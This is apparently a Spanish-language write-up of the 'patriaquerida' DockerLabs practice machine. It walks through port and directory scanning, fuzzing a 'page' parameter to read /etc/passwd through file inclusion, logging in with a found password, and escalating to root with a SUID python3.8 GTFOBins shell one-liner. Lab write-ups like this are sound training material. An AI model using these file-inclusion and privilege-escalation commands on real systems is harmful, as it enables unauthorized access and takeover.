nmap:  22,80

![image](https://github.com/user-attachments/assets/eaad09c8-5a05-446f-96cb-e8c76e63dd4f)

en la pagina como en el nmap, vemos que es apache2, en el código fuente no hay nada, hacemos un gobuster

     gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,py,txt -t 64


y nos da in index.php

![image](https://github.com/user-attachments/assets/31191b22-876a-44d3-8876-3e596b67f795)

![image](https://github.com/user-attachments/assets/6ff70d6f-697d-4666-90f8-355f6bbe8d46)

buscamos eso y da solo en la pagina un "balu"

![[hidden.png]]

probé con hydra pero no obtuve nada. Como la carpeta o directorio que nos dio, podemos probar con ffuf

     ffuf -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 

y nos dio un: page

![[page.png]]

y obtenemos

![[dockerlabs/facil/patriaquerida/etc.png]]

nos dan dos usuarios: pinguino y mario. probamos a los usuarios con la contraseña "balu"

entramos

![[dockerlabs/facil/patriaquerida/conexion.png]]

y escalamos a mario muy facil

![[dockerlabs/facil/patriaquerida/conexion2.png]]

utilizamos el comando

     find / -perm -4000 -ls 2>/dev/null

y nos da un binario importante 

![[python1.png]]

la buscamos en https://gtfobins.github.io/gtfobins/python/#sudo

![[python2.png]]

modificamos el python a python3.8 como el binario y lanzamos

     python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

![[dockerlabs/facil/patriaquerida/root.png]]

somos root!
